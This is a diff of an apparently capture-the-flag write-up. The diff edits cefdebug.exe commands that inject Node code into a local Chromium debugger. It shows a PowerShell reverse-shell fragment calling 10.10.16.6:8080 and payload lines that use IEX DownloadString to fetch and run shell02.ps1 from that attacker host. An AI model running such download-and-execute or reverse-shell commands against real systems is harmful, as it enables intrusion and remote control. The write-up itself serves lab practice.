@@ -105,13 +105,13 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',8080);$stream = $
 
 Payload
 ```
-.\cefdebug.exe --url ws://127.0.0.1:8509/7c9c5946-7d08-4ef4-b724-87be420324bc --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6//shell02.ps1')"
+.\cefdebug.exe --url ws://127.0.0.1:47143/689fb61d-e26a-485a-8eee-4b88bef946a5 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6//shell02.ps1')"
 ```
 
 Invoke-WebRequest -Uri http://10.10.16.6/cefdebug/cefdebug.exe -OutFile cefdebug.exe
 
 ```
-.\cefdebug.exe --url ws://127.0.0.1:32630/9630313f-5192-41f1-ab29-8c75a3f04186 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.6/shell02.ps1\')')"
+.\cefdebug.exe --url ws://127.0.0.1:47143/689fb61d-e26a-485a-8eee-4b88bef946a5 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.6/shell02.ps1\')')"
 ```
 
 Finally it worked and guess what i have written the reverse shell name wrong
